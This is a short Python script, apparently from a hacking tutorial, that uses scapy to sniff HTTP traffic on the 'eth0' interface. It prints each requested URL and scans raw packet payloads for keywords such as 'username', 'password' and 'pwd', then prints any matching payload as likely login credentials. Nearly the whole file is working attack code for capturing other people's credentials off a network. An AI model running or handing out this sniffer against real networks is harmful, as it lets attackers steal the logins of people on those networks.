#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #store=False will tell scapy to not store anything in memory
    #prn=xyz will execute xyz fucntion for every packet sniffed, and iface is used to specify the interface

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # done to capture the url the user is trying to access

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # for specifying any layer we can use scapy.RAW(i.e scapy.layer_name) but in the above line we use http.HTTPRequest
        # because scapy does not have a http filter and that is why we imported the http layer at the start(top)
        load = packet[scapy.Raw].load  # in the raw layer the password and the username field is stored in the load field like we used dst and src before
        # to check if the packet has a layer we use .haslayer(name of the layer) and while printing we use packet[layer name].field
        keywords = ["username", "user", "usr", "login", "password", "pwd", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")